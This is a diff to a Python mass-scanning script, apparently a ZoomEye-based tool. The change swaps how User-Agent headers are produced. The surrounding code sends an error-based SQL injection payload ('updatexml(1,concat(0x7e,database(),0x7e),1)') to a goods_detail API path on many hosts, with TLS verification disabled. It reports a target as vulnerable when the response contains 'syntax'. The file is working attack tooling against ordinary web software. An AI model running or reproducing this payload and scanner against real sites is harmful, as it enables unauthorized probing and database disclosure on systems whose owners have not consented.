@@ -1,13 +1,9 @@
 import requests, os, re
 # from zoomeye_scan.lib.get_user_agent import get_user_agent
 from requests.packages import urllib3
-from fake_useragent import UserAgent
+from zoomeye_scan.lib.get_user_agent import get_user_agent
 
 urllib3.disable_warnings()
-ua = UserAgent()
-headers = {
-    'User-Agent': ua.chrome
-}
 # /seller.php?s=/Public/login
 def sqli():
     vunl_path = "/index.php?s=api/goods_detail&goods_id=1 and updatexml(1,concat(0x7e,database(),0x7e),1)"
@@ -24,7 +20,7 @@ def sqli():
                         vunl_url = "http://" + url[0] + vunl_path
                         # print(vunl_url)
                     try:
-                        r = requests.get(url=vunl_url, headers=headers, verify=False, timeout=5)
+                        r = requests.get(url=vunl_url, headers=get_user_agent(), verify=False, timeout=5)
                         print("[^]正在测试:", vunl_url)
                         if "syntax" in r.text:
                             print("上诉地址存在SQL注入")
@@ -35,7 +31,7 @@ def sqli():
                             if "https://" not in url[0]:
                                 vunl_url = "https://" + url[0] + vunl_path
                                 # print(vunl_url)
-                                r = requests.get(url=vunl_url, headers=headers, verify=False, timeout=5)
+                                r = requests.get(url=vunl_url, headers=get_user_agent(), verify=False, timeout=5)
                                 print("[^]正在测试:", vunl_url)
                                 if "syntax" in r.text:
                                     print("上诉地址存在SQL注入")
